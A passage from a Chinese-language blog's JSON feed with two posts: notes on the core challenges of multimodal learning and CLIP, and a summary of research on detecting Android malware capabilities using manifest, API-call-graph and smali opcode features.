Representation</h3>\n<p>​\t第一个基本挑战是学习如何<strong>利用多种模态的互补性和冗余性的方式表示和总结多模态数据</strong>（<u>个人理解，即如何表示数据让计算机看得懂、能处理</u>）。多模态数据的异质性使得构建这样的表示具有挑战性，例如，语言通常是象征性的，而音频和视觉形式将被表示为信号。</p>\n<blockquote>\n<p>​\t<strong>单模态的表征负责将信息表示为计算机可以处理的数值向量或者进一步抽象为更高层的特征向量。</strong></p>\n<p>​\t<strong>多模态表征是指通过利用多模态之间的互补性，剔除模态间的冗余性，从而学习到更好的特征表示。</strong></p>\n</blockquote>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051431550.png\" alt=\"Representation\"></p>\n<h4 id=\"联合表征\"><a class=\"markdownIt-Anchor\" href=\"#联合表征\">#</a> 联合表征</h4>\n<p>​\t<strong>联合表征</strong>（Joint Representation）<u>将多个模态的信息一起映射到一个统一的多模态向量空间</u>，Joint 结构注重捕捉多模态的<strong>互补性</strong>，融合多个输入模态 x1 , x2 获得多模态表征 Xm = f (x1 ,…,xn)，进而利用 Xm 完成某种预测任务。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211052136742.png\" alt=\"Joint Representation\"></p>\n<p>​\tMultimodal learning with deep boltzmann machines (NIPS 2012) 提出将 deep boltzmann machines（DBM） 结构扩充到多模态领域，通过 Multimodal DBM，可以学习到多模态的<strong>联合概率分布</strong>。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051458819.png\" alt=\"Multimodal DBM 模型\"></p>\n<p>​\t在获得图像与文本间的<strong>联合概率分布</strong>后，在应用阶段：</p>\n<ul>\n<li>输入图片，<u>利用条件概率 P (文本 | 图片)，生成文本特征</u>，可以得到图片相应的文本描述；</li>\n<li>输入文本，<u>利用条件概率 P (图片 | 文本)，可以生成图片特征</u>，通过检索出最靠近该特征向量的两个图片实例，可以得到符合文本描述的图片。</li>\n</ul>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051506598.png\" alt=\"Multimodal DBM 应用\"></p>\n<h4 id=\"协同表征\"><a class=\"markdownIt-Anchor\" href=\"#协同表征\">#</a> 协同表征</h4>\n<p>​\t协同表征（Coordinated Representation）<u>将多模态中的每个模态分别映射到各自的表示空间，但映射后的向量之间满足一定的相关性约束（例如线性相关）</u>。Coordinated 结构并不寻求融合而是建模多种模态数据间的<strong>相关性</strong>，它将多个 (通常是两个) 模态映射到协作空间，表示为：f (x1)～g (x2)，其中 **<u>～</u>** 表示一种协作关系。网络的优化目标是这种协作关系 (通常是相似性，即最小化 cosine 距离等度量)。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211052203950.png\" alt=\"Coordinated Representation\"></p>\n<p>​\t<u>NIPS 2014</u>（一个关于机器学习和计算神经科学领域的人工智能国际会议) ，利用<strong>协同学习到的特征向量之间满足加减算数运算</strong>这一特性，可以搜索出与给定图片满足 “<strong>指定的转换语义</strong>” 的图片。例如：狗的图片特征向量 - 狗的文本特征向量 + 猫的文本特征向量 = 猫的图片特征向量 -&gt; 在特征向量空间，根据最近邻距离，检索得到猫的图片。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211090619157.png\" alt=\"多模态向量空间运算\"></p>\n<h3 id=\"翻译translation\"><a class=\"markdownIt-Anchor\" href=\"#翻译translation\">#</a> 翻译 Translation</h3>\n<p>​\t第二个挑战涉及<strong>如何将数据从一种模式转化（映射）到另一种模式</strong>。不仅数据是异构的，而且模态之间的关系通常是开放式的或主观的。例如，存在多种描述图像的正确方法，并且可能不存在一种完美的翻译。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t<u>基于实例的方法</u> <u>模型驱动的方法</u></p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051434189.png\" alt=\"Translation\"></p>\n<h4 id=\"常见应用\"><a class=\"markdownIt-Anchor\" href=\"#常见应用\">#</a> 常见应用</h4>\n<ul>\n<li><strong>机器翻译（Machine Translation）</strong>：将输入的语言 A（即时）翻译为另一种语言 B。类似的还有唇读（Lip Reading）和语音翻译 （Speech Translation），分别将唇部视觉和语音信息转换为文本信息。</li>\n<li><strong>图片描述（Image captioning) 或者视频描述（Video captioning)</strong>： 对给定的图片 / 视频形成一段文字描述，以表达图片 / 视频的内容。</li>\n<li><strong>语音合成（Speech Synthesis）</strong>：根据输入的文本信息，自动合成一段语音信号。</li>\n</ul>\n<h4 id=\"翻译的评估困境\"><a class=\"markdownIt-Anchor\" href=\"#翻译的评估困境\">#</a> 翻译的评估困境</h4>\n<p>​\t多模态翻译方法面临的一个主要挑战是它们很难评估（<u>即在无对错之分的情况下判断哪个是更好的</u>）。语音识别等任务只有一个正确的翻译，而语音合成和媒体描述等任务则没有。有时，就像在语言翻译中，多重答案是正确的，决定哪个翻译更好往往是主观的。</p>\n<ul>\n<li><strong>人工评价</strong>是最理想的评估，但是<u>耗时耗钱</u>，且需要多样化打分人群的背景以避免偏见。</li>\n<li><strong>自动化指标</strong>是视觉描述领域常用的替代方法，包括 BLEU，Meteor，CIDEr，ROUGE 等，但它们被证实与人的评价相关性较弱。</li>\n<li><strong>基于检索的评估</strong>和<strong>弱化任务</strong>，例如：将图像描述中一对多映射简化为 VQA（<u>给机器一张图片和一个开放式的的自然语言问题，要求机器输出自然语言答案，答案可以是以下任何形式：短语、单词、 (yes/no)、从几个可能的答案中选择正确答案。 VQA 是一个典型的多模态问题，计算机需要同时学会理解图像和文字。</u>）中一对一的映射，也是解决评估困境的手段。</li>\n</ul>\n<h3 id=\"对齐alignment\"><a class=\"markdownIt-Anchor\" href=\"#对齐alignment\">#</a> 对齐 Alignment</h3>\n<p>​\t第三个挑战是从<strong>两种或多种不同的模态中识别（子）元素之间的直接关系</strong>。例如，我们可能希望<u>将食谱中的步骤与显示正在制作的菜肴的视频对齐</u>。为了应对这一挑战，我们需要测量不同模式之间的相似性并处理可能的长期依赖和歧义。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t显式对齐 隐式对齐</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051433591.png\" alt=\"Alignment\"></p>\n<h4 id=\"显式对齐\"><a class=\"markdownIt-Anchor\" href=\"#显式对齐\">#</a> 显式对齐</h4>\n<p>​\t如果模型的<strong>主要目标是对齐来自两个或多个模态的子元素</strong>，那么我们将其分类为执行显式对齐。显式对齐的一个重要工作是<strong>相似性度量</strong>。大多数方法都依赖于度量不同模态的子组件之间的相似性作为基本构建块。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211071349090.png\" alt=\"显式对齐\"></p>\n<p>包括无监督和弱监督的方法：</p>\n<ul>\n<li><strong>无监督对齐</strong>：给定两个模态的数据作为输入，希望模型实现子元素的对齐，但是训练数据没有 “对齐结果” 的标注，模型需要同时学习相似度度量和对齐方式。</li>\n<li><strong>有监督对齐</strong>：有监督方法存在标注，可训练模型学习相似度度量。</li>\n</ul>\n<h4 id=\"隐式对齐\"><a class=\"markdownIt-Anchor\" href=\"#隐式对齐\">#</a> 隐式对齐</h4>\n<p>​\t隐式对齐<strong>用作另一个任务的中间 (通常是潜在的) 步骤。</strong> 这允许在许多任务中有更好的表现，包括语音识别、机器翻译、媒体描述和视觉问题回答。这些模型不显式地对齐数据，也不依赖于监督对齐示例，而是学习如何在模型训练期间潜在地对齐数据。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211071428784.png\" alt=\"隐式对齐\"></p>\n<h3 id=\"融合fusion\"><a class=\"markdownIt-Anchor\" href=\"#融合fusion\">#</a> 融合 Fusion</h3>\n<p>​\t第四个挑战是<strong>结合来自两个或多个模态的信息</strong>来执行<u>预测</u>。例如，对于视听语音识别，将嘴唇运动的视觉描述与语音信号融合以预测口语。来自不同模态的信息可能具有不同的预测能力和噪声拓扑，并且可能在至少一种模态中丢失数据。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t模型无关的方法</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051435164.png\" alt=\"Fusion\"></p>\n<h4 id=\"模型无关的方法\"><a class=\"markdownIt-Anchor\" href=\"#模型无关的方法\">#</a> 模型无关的方法</h4>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t基于模型的方法</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051436546.png\" alt=\"Fusion\"></p>\n<h4 id=\"基于模型的方法\"><a class=\"markdownIt-Anchor\" href=\"#基于模型的方法\">#</a> 基于模型的方法</h4>\n<h3 id=\"协同学习co-learning\"><a class=\"markdownIt-Anchor\" href=\"#协同学习co-learning\">#</a> 协同学习 Co-learning</h3>\n<p>​\t第五个挑战是在模态的表示和它们的预测模型之间转移知识。协同学习探索了<strong>如何从一种模态中学习的知识帮助在不同模态上训练的计算模型</strong>（<u>使用一个资源丰富的模态信息来辅助另一个资源相对贫瘠的模态进行学习</u>）。当其中一种模式的资源有限（例如，带注释的数据）时，这一挑战尤其重要。辅助模态（helper modality）通常只参与模型的训练过程，并不参与模型\t的测试使用过程</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211051437074.png\" alt=\"Co-learning\"></p>\n<h4 id=\"并行\"><a class=\"markdownIt-Anchor\" href=\"#并行\">#</a> 并行</h4>\n<p>​\t需要训练数据集，其中来自一种模态的观察结果与来自其他模态的观察结果直接相关，例如在一个视听语音数据集中，视频和语音样本来自同一个说话者。</p>\n<h4 id=\"非并行\"><a class=\"markdownIt-Anchor\" href=\"#非并行\">#</a> 非并行</h4>\n<p>​\t不需要来自不同模式的观察结果之间的直接联系，通常通过使用类别重叠来实现共同学习，例如，在零样本学习中，使用来自 Wikipedia 的纯文本数据集扩展传统的视觉对象识别数据集以改进视觉对象识别的泛化能力。</p>\n<h4 id=\"混合\"><a class=\"markdownIt-Anchor\" href=\"#混合\">#</a> 混合</h4>\n<p>​\t通过共享模式或数据集桥接</p>\n<h2 id=\"sota模型-clip\"><a class=\"markdownIt-Anchor\" href=\"#sota模型-clip\">#</a> SOTA 模型 - CLIP</h2>\n<p>​\t<strong>CLIP</strong>，全称 Contrastive Language-Image Pre-training，是 OpenAI 最新的一篇 NLP 和 CV 结合的<u>多模态</u>的工作，在多模态领域迈出了重要的一步。</p>\n<p><img src=\"https://oss.imzhanghao.com/img/202211081504107.png\" alt=\"CLIP Zero shot\"></p>\n<p>​\t\t\tCLIP 主要的贡献就是<u>利用无监督的文本信息，作为监督信号来学习视觉特征</u>。</p>\n",
            "tags": [
                "MultiModal Learning"
            ]
        },
        {
            "id": "http://aer0liteee.github.io/post/f862a75e.html",
            "url": "http://aer0liteee.github.io/post/f862a75e.html",
            "title": "Cyber-Code-Intelligence-for-malware-detection",
            "date_published": "2023-07-09T10:15:13.000Z",
            "content_html": "<h1 id=\"cyber-code-intelligence-for-malware-detection\"><a class=\"markdownIt-Anchor\" href=\"#cyber-code-intelligence-for-malware-detection\">#</a> Cyber Code Intelligence for malware detection</h1>\n<p>[TOC]</p>\n<h2 id=\"摘要\"><a class=\"markdownIt-Anchor\" href=\"#摘要\">#</a> 摘要</h2>\n<p>​\t不断演变的安卓恶意软件对移动用户构成了严重的安全威胁，基于机器学习 (ML) 的防御技术吸引了积极的研究。由于缺乏知识，许多<strong>零日家族的恶意软件</strong>可能仍然没有被发现直到分类器获得专门的知识。<u>大多数现有的基于 ML 的方法将需要很长的时间来学习最新的恶意软件家族景观中的新恶意软件家族</u>。现有的基于 ML 的 Android 恶意软件检测和分类方法很难应对恶意软件的快速演变，特别是在零日恶意软件家族的出现和单视图特征的有限代表性方面。</p>\n<h2 id=\"目的\"><a class=\"markdownIt-Anchor\" href=\"#目的\">#</a> 目的</h2>\n<p>​\t在这篇文章中，我们开发了一个新的 **<u>多视图特征智能 (MFI)</u>** 框架，<u>从已知的恶意软件家族中学习目标能力的表示，以识别具有相同能力的未知和不断变化的恶意软件</u>。</p>\n<p>​\t新框架执行逆向工程以提取多视图异质特征包括：</p>\n<ol>\n<li>\n<p>语义字符串特征、</p>\n</li>\n<li>\n<p>API 调用图特征</p>\n</li>\n<li>\n<p>smali 操作码（<strong><u>smali opcode</u></strong>）顺序特征。</p>\n<ul>\n<li>\n<p><strong>Smali Opcode</strong> 是一种用于描述 Android Dalvik 虚拟机指令的语言。<u>Dalvik 虚拟机是 Android 操作系统上运行应用程序的基础</u>。</p>\n<p>Smali Opcode <u>使用基于文本的语法来描述 Dalvik 字节码指令</u>。<u>它是一种类汇编语言，用于编写和修改已编译的 Android 应用程序的字节码</u>。</p>\n<p>每个 Dalvik 指令都由<u>一个操作码（opcode）和零个或多个操作数</u>组成。操作码表示特定操作的类型，例如加载值到寄存器、进行算术运算或跳转等。操作数提供了指令所需的数据。</p>\n<p>Smali Opcode 在文本文件中按顺序列出指令，并使用特定的语法来定义操作码和操作数。示例如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">const/4 v0, 0x1</span><br><span class=\"line\">const/16 v1, 0x64</span><br><span class=\"line\">add-int v2, v0, v1</span><br><span class=\"line\">return v2</span><br></pre></td></tr></table></figure>\n<p>上述示例中的代码片段演示了一些常见的 Smali Opcode。其中，指令  <code>const/4</code>  将整数常量值（0x1）加载到寄存器  <code>v0</code>  中，指令  <code>const/16</code>  加载整数常量值（0x64）到寄存器  <code>v1</code>  中，指令  <code>add-int</code>  将寄存器  <code>v0</code>  和  <code>v1</code>  中的值相加，并将结果放入寄存器  <code>v2</code>  中，最后的  <code>return</code>  指令将结果从方法中返回。</p>\n<p>通过<u>使用 Smali Opcode，开发人员可以直接修改编译后的应用程序的字节码，以实现一些高级功能、优化性能或进行代码混淆等操作</u>。然而，修改已编译的字节码需要对 Smali Opcode 语法和 Dalvik 指令集有一定的了解。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p>​\t它可以通过一系列的<u>特征分析、选择、聚合和编码过程</u>从已知的恶意软件家族中学习目标能力的表示，以检测具有共享目标能力的未知 Android 恶意软件。我们创建了一个新的数据集，其中有关于能力的真实信息。在新数据集上进行了许多实验，以评估新方法的性能和有效性。结果表明，在检测具有目标能力的未知 Android 恶意软件时，新方法优于三种最先进的方法，包括:</p>\n<ol>\n<li>Drebin</li>\n<li>MaaDroid</li>\n<li>N-opcode</li>\n</ol>\n<h2 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>​\tAndroid 在移动操作系统中占<strong>主导地位</strong>，全球有<u>74.13%</u>的手机运行安卓系统。根据 Statista 的报告，在 2019 年 12 月。仅在官方的 GooglePlay 应用商店中，就有近 300 万个 Android 应用软件。在 2020 年第一季度，尽管从 2018 年初 360 万的峰值下降，但仍有很多应用程序可用 。<u>安卓系统的普及为安卓恶意软件作者提供了激励</u>，而<u>对安卓应用程序进行逆向工程的方法相对容易</u>，导致安卓恶意软件的蓬勃发展。</p>\n<p>​\tAndroid 恶意软件家族存在三个主要问题。</p>\n<ol>\n<li>首先，在<u>建立安卓恶意软件家族方面没有统一的标准</u>，因此大多数反病毒公司对家族的命名都不一样。这种临时性的方法为快速分享零日恶意软件的知识造成了障碍。ViruusTotal 通过应用多数投票策略，为特定的恶意软件样本确定一个单一家族的类别标签，从而缓解了命名不一致的问题。</li>\n<li>其次，安卓恶意软件家族的数量在 2018 年超过了 1000 个 ，并且不断激增，没有任何放缓的迹象。由于人类的错误和误判，安卓恶意软件家族的<u>爆炸性增长</u>挑战了从人类专家到基于 ML 的检测器的知识转移。</li>\n<li>第三，<u>安卓恶意软件家族的分布是高度倾斜</u>的，因为在大多数家族中只有少数几个样本可用。例如，在大约 58% 的 Android 恶意软件家族中，只有不到五个样本在 Drebin 数据集中。<u>安卓恶意软件的高度不平衡分布，对特征分析和模式识别的过程提出了挑战</u>。因此，需要另一种替代性的分类方法来检测安卓零日恶意软件。</li>\n</ol>\n<h3 id=\"主要贡献\"><a class=\"markdownIt-Anchor\" href=\"#主要贡献\">#</a> 主要贡献</h3>\n<p>​\t\t这篇文章的主要贡献有三方面。</p>\n<ol>\n<li>\n<p><u>对安卓恶意软件的恶意能力进行了深入的分析</u>，并<u>创建了一个带有验证过的地面真实性分配的数据集</u>，<u>用于检测具有针对性能力的不断发展的安卓恶意软件</u>。（这个名为 &quot;<strong><u>CAPA</u></strong>&quot; 的新数据集将向公众发布为 Android 恶意软件的新研究提供启示。）</p>\n</li>\n<li>\n<p>我们提出了一种新的<u>多视图特征智能 (MFI)</u> 方法。MFI 提取多视图异质特征 (源代码视图、API 图形调用视图和 smali 操作码视图。<u>MFI 将这些特征聚集成一个统一的表示，用于描述恶意的能力</u>。此外，MFI 表示可以被送入一个神经模型，以识别具有目标能力的零日恶意软件。</p>\n</li>\n<li>\n<p>我们进行了大量的实验，从几个方面评估新的 MIFI 方法，包括<u>识别精度、处理零日系恶意软件的有效性、识别效果和可扩展性</u>。MFI 胜过了三种最先进的方法，包括:</p>\n<ul>\n<li>Drebin</li>\n<li>MaMaDroid</li>\n<li>N-opcode</li>\n</ul>\n<p>在检测具有目标能力的未知安卓恶意软件时。这项工作的所有数据、代码和报告都将在 Github 上发布 (<a href=\"https://github.com/JunTomyang/Android-Malware-Capability-Identification\">https://github.com/JunTomyang/Android-Malware-Capability-Identification</a>)</p>\n</li>\n</ol>\n<h3 id=\"文章结构\"><a class=\"markdownIt-Anchor\" href=\"#文章结构\">#</a> 文章结构</h3>\n<p>​\t\t本文的其余部分结构如下：</p>\n<ul>\n<li>第二节介绍了<u>Android 恶意软件检测和家族分类的相关工作</u></li>\n<li>第三节<u>讨论我们提出的方法</u></li>\n<li>第四节介绍了与<u>基线方法的比较实验和一些详细的分析</u></li>\n<li>第五节给出<strong>结论</strong></li>\n</ul>\n<h2 id=\"相关工作\"><a class=\"markdownIt-Anchor\" href=\"#相关工作\">#</a> 相关工作</h2>\n<p>​\t表一比较和对比了我们的研究工作和最先进的工作，包括 DroidAPIMiner、Drebin 、DroidSIFT、HinDroid、MaMaDroid 和 ASTROID。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64a980f11ddac507ccb84e3d.jpg\" alt=\"表一 &amp;&amp; 图一\"></p>\n<p>​\t我们专注于开发一种新的 MFI 方法，以识别具有目标能力的不断发展的 Android 恶意软件。这项工作的目的是<u>识别零日家族的新恶意软件样本</u>。</p>\n<h2 id=\"u网络代码情报的新方法u\"><a class=\"markdownIt-Anchor\" href=\"#u网络代码情报的新方法u\">#</a> <u>网络代码情报的新方法</u></h2>\n<p>​\t\t图 1 概述了我们提出的用于检测具有目标能力的恶意软件的 MFI。我们将恶意能力识别作为一个二元分类问题。一类是具有目标能力的恶意软件，而另一类则没有这种能力。给出原始 APK 样本，进行逆向工程以拆解二进制代码，然后提取多视图异质特征来重新发送恶意软件样本。将进行特征编码和聚合，以去除噪声和不相关的特征，并将多视图特征转换为向量，从而准确反映恶意软件恶意能力的内在特征。应用深度神经模型对输入的表示向量进行二元分类。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64a982641ddac507ccbb69bc.jpg\" alt=\"多视图特征智能 (MFI)框架流程图 \"></p>\n<ul>\n<li>\n<p><strong>MFI 流程图</strong></p>\n<ul>\n<li>收集特定能力的训练恶意软件</li>\n<li>静态分析的逆向工程</li>\n<li>从反汇编的代码中解析原始信息</li>\n<li>提取多视图异构特征</li>\n<li>异构特征预处理</li>\n<li>多视图特征融合</li>\n<li>训练深度神经网络进行能力识别</li>\n</ul>\n<h3 id=\"新数据和地面实况\"><a class=\"markdownIt-Anchor\" href=\"#新数据和地面实况\">#</a> 新数据和地面实况</h3>\n<p>​\t当把大量的安卓恶意软件与适当的安全 / 隐私相关能力联系起来时，MFI 的直接挑战之一就出现了。据我们所知，在现有的研究数据集中，<u>安全 / 隐私相关的能力没有明确的标签</u>。由于缺乏定义明确的基础真相，现有的公开可用的安卓系统恶意软件数据集需要进一步的标记过程。因此，我们创建了一个<strong>带有能力注释的安卓恶意软件数据集</strong>，我们将其称为 **<u>CAPA 数据集</u>**。</p>\n<p>​\t<u>CAPA 数据集是通过聚合两个著名的安卓恶意软件数据集 Drebin 和 AMD 得到的</u>。</p>\n</li>\n<li>\n<p><strong>Drebin 数据集</strong>包含 5560 个安卓恶意软件应用，来自于 2010 年 8 月至 2012 年 10 月期间收获了 179 个恶意软件家族。</p>\n</li>\n<li>\n<p><strong>AMD 数据集</strong>包含 2010 年至 2016 年期间收集的 71 个不同恶意软件家族的 24 553 个 Android 恶意软件样本。</p>\n<blockquote>\n<p>AMD 数据集比 Drebin 数据集要新，被社区的研究人员广泛使用。</p>\n</blockquote>\n</li>\n</ul>\n<p>​\tCAPA 数据集由 2010 年至 2016 年七年间的 Android 恶意软件样本组成。随着 17 个家族在 Drebin 和 AMD 数据集之间的重复，<u>在最新版本的 CAPA 数据集中，总共包括 72 个家族或 7110 个应用程序。</u></p>\n<p>​\t为了验证我们提出的 MFI 的有效性，作为一个概念证明，我们选择了四种非常常见的能力作为案例研究，它们与四个主要的网络安全问题非常一致: <strong>远程控制、特权、货币化和隐私</strong>。不出所料，<u>许多恶意样本拥有这四种能力中的一种或几种</u>：</p>\n<ol>\n<li>僵尸网络攻击 (远程控制)</li>\n<li>未经授权的 root 访问 (权限)</li>\n<li>恶意短信收费 (货币化)</li>\n<li>窃取信息 (隐私)</li>\n</ol>\n<p>能力类别的完整列表见表二</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa0fed1ddac507cc6cf914.png\" alt=\"与安全/隐私相关的能力列表\"></p>\n<h3 id=\"多视图异构结构特征\"><a class=\"markdownIt-Anchor\" href=\"#多视图异构结构特征\">#</a> 多视图异构结构特征</h3>\n<p>​\t为了全面描述安卓恶意软件，以便更好地识别与安全隐私有关的能力，我们提取了三个异质特征的视图来代表安卓恶意软件样本。</p>\n<ol>\n<li>\n<p><strong>源代码中的语义字符串特征:</strong></p>\n<p>​\t在这项工作中，从<strong> AndroidManifestxml</strong> 文件中提取各种类型的语义信息以形成特征。 <u>AndroidManifestxm 文件驻留在所有 Android 应用包的根目录中，并向 Android 系统提供关于应用的基本信息</u>。这四个基本信息来源包括：</p>\n<ul>\n<li><strong>应用程序要求的权限</strong></li>\n<li><strong>应用程序的软件组件</strong></li>\n<li><strong>应用程序要求的硬件组件</strong></li>\n<li><strong>过滤的意图</strong></li>\n</ul>\n<p>​    这四类信息可以被有效提取，以反映安卓应用的部分特征。具体来说，<u>安卓应用在访问包含敏感信息的资源之前，需要请求终端用户授予某些权限</u>。</p>\n</li>\n<li>\n<p><strong>第二个主要的信息来源是从字节码 classes.dex 文件中提取的：</strong></p>\n<p>​\t对字节码进行反汇编，以检索语义信息，包括应用中使用的 API 调用和数据。四个基本信息源包括：</p>\n<ul>\n<li><strong>受限的 API 调用</strong></li>\n<li><strong>可疑的 API 调用</strong></li>\n<li><strong>使用的权限</strong></li>\n<li><strong>网络地址</strong></li>\n</ul>\n<p>​    这四种类型的信息提供了字节码的足迹。具体来说，<u>受限的 API 调用表明应用程序的敏感功能</u>；<u>可疑的 API 调用暴露了 Android 恶意软件的安全 / 隐私相关行为</u>；<u>权限信息共同反映了多个 API 调用的关系</u>；<u>网络地址可能与已知的恶意网站或僵尸网络有关</u>。</p>\n<p>​\t为了从原始恶意软件中获得这些字符串特征，我们使用开源工具 Androguard ( <a href=\"https://github.com/androguard/androguard\">https://github.com/androguard/androguard</a>)。 Androguard 帮助我们从 classes.dex 文件中拆解字节码，并根据上述类别从 AndroidManifest.xml 文件中收集信息。提取的信息形成了语义特征，可以有效地在源代码层面上表示 Android 恶意软件。</p>\n<p>​\t<strong>Androguard</strong> 是使用 Python 编写的逆向工具，它可以在多个平台上运行 Linux/Windows/OSX。使用它可以反编译 android 应用，也可以用来做 android app 的静态分析（static analysis）</p>\n<ul>\n<li>\n<p><strong><a href=\"http://androapkinfo.py\">androapkinfo.py</a></strong> 查看 apk 文件的包、资源、权限、组件、方法等信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./androapkinfo.py -i ./test.apk</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong><a href=\"http://androxml.py\">androxml.py</a></strong> 解密 apk 包中的 AndroidManifest.xml 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./androxml.py -i -i ./test.apk</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>​    在这篇文章中，我们捕获了结构性 API 调用图，以减轻 Android 恶意软件数据集中的规避样本，下图 2 显示了提取 API 调用图特征的过程。<u>API 调用图被提取并嵌入到矢量表示中，旨在捕获恶意软件的行为</u>。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa18541ddac507cc7e292e.jpg\" alt=\"API调用图特征的过程\"></p>\n<ul>\n<li>提取 API 调用图</li>\n<li>抽象 API 到家庭颗粒度</li>\n<li>将 API 调用图嵌入到 向量中</li>\n</ul>\n</li>\n<li>\n<p><strong>来自中间的 smali 代码的操作码顺序特征：</strong></p>\n<p>​\t作为字节码 classes.dex 文件的汇编器 / 反汇编器，<u>smali/baksmali 提供 smali 语言的人类可读代码</u>， <u>smali 代码比 Dalvik 虚拟机用来执行 Android 应用程序的机器代码更容易解释</u>。</p>\n<p>​\t在本文中，根据 smali 编程规范，字节码 classes.dex 文件被拆解为一组 smali 代码。classes.dex 文件中的每个类都被翻译成一个单独的 smali 文件，每个 smali 文件都包含相应类中的多个方法。<u>每个 smali 条目由个操作码和多个操作数组成</u>，其格式为人类可读的。</p>\n<p>​\t<u>操作码被分为七个核心指令集以简化分类器的设计</u>, 具体来说，这些指令集是<strong> Move,Return,Goto,If,Get,Put,Invoke</strong>。操作码的分离有助于有效地区分相关的操作数，表三总结了指令集的七种类型。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa18e11ddac507cc7f7e56.png\" alt=\"指令集的七种类型\"></p>\n<p>​\t随后，获得一个 n-grams（n 元语法）表示，以代表安卓恶意软件。对于一个完整的表示，<u>通过遍历翻译后的 smali 文件来提取操作码序列，以保留 Android 恶意软件的信息，这种安排保证了在 smali 操作码级别的粒度</u>。</p>\n</li>\n</ol>\n<h3 id=\"特征编码和聚合\"><a class=\"markdownIt-Anchor\" href=\"#特征编码和聚合\">#</a> 特征编码和聚合</h3>\n<p>​\t\t在这项工作中，<strong>多视图的异构特征被预先处理，以形成最终的联合向量表示</strong>。为了减少特征维度，去除不相关的特征，缓解下面深度神经网络的复杂性，对于源码中的语义字符串特征，我们根据不同的安全 / 隐私相关能力的特点选择关键的特征子集。例如，对于，恶意短信战能力，将选择<u>SEND SMS</u>、<u>RECEIVE SMS</u> 和<u>WRITE SMS</u>相关的权限特征。</p>\n<blockquote>\n<p><strong>SMS</strong> 是<u>Short Messaging Service（短消息服务）</u>的缩写，是一种使用移动设备可以发送和接收文本信息的技术短信内容，以文本、数字或二进制非文本数据为主，目前，这种短消息的长度被限定在 140 字节之内。</p>\n</blockquote>\n<p>​\t对于结构性 API 调用图的特点，如图 2 所示，以提高对 API 变化的弹性并实现可扩展性。因此，所有的 API 调用都被抽象为开发者定义的家族、混清的家族或九个安卓原生家族之一，包括:</p>\n<p>​\tl) com.google 2) xml 3) apache 4)javax 5) java 6) android 7) dom 8) json 9) dalvik</p>\n<p>​\t这些家族是 Android 操作系统的一部分，<u>它们提供了许多不同的 API，可以用于开发 Android 应用程序</u>，这些 API 包括网络、数据库、图形、用户界面和其他功能。</p>\n<p>​\t在所有视图的特征向量生成后，<u>我们将这些特征向量汇总，为每个恶意软件应用构建一个联合特征向量</u>。因此，<strong>最终的特征向量有 149 个维度</strong>。</p>\n<h3 id=\"通过神经模型进行能力识别\"><a class=\"markdownIt-Anchor\" href=\"#通过神经模型进行能力识别\">#</a> 通过神经模型进行能力识别</h3>\n<p>​\t在这一步，安全 / 隐私相关的能力识别任务被执行，即识别具有信息窃取能力的 Android 恶意软件。最近的一个趋势显示，基于深度神经网络的解决方案在检测安卓恶意软件方面很受欢迎。<u>一旦用高质量的数据进行训练，深度神经网络可以有效地学习安卓恶意软件的复杂特征和行为</u>。在这篇文章中，我们构建了一个深度神经网络架构来进行能力识别任务，同时<strong>通过对安卓恶意软件的紧凑表示来实现高的能力识别精度</strong>。</p>\n<p>​\t对于具体的能力，网络结构在层数和神经元的数量上有微小的变化。<strong>优化器</strong>从<u>&quot;SGD”、&quot;Adadelta”、&quot;RMSprop 和&quot;Adamax&quot;</u>中选择。而<strong>损失函数</strong>的选择是 “<u>binary crossentropy</u>”。<strong>过度拟合是深度神经网络的主要问题之一</strong>，在这项工作中，<strong>为了缓解过拟合的问题，我们应用了 dropout 正则化技术</strong>。</p>\n<p>​\t在我们的深度神经网络的训练阶段，验证集是用训练集的 20% 形成的，以监测训练集和验证集的准确性趋势。<strong>验证集表明模型的训练是否正确，是否有过度拟合</strong>。如果训练集和验证集的精度增长明显不同，那么学习过程将被终止，并在重新开始训练过程之前修改建模参数以避免过拟合问题。</p>\n<h2 id=\"对mfi的性能评估\"><a class=\"markdownIt-Anchor\" href=\"#对mfi的性能评估\">#</a> 对 MFI 的性能评估</h2>\n<h3 id=\"实验环境\"><a class=\"markdownIt-Anchor\" href=\"#实验环境\">#</a> 实验环境</h3>\n<p>​\t为了验证我们提出的 MFI 的有效性，作为概念验证，本文选择了<strong>四</strong>种常见的、具有代表性的安全 / 隐私相关功能（<strong>僵户网络政击、未经授权的根访问、恶意短信收费和信息窃取</strong>）作为案例研究来进行实验。为了模拟零日恶意软件家族的识别，<u>训练数据只包括恶意软件家族的一个子集</u>，而<u>测试集包含在训练过程中未见过的恶意软件家族</u>。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa2d9a1ddac507cca69446.jpg\" 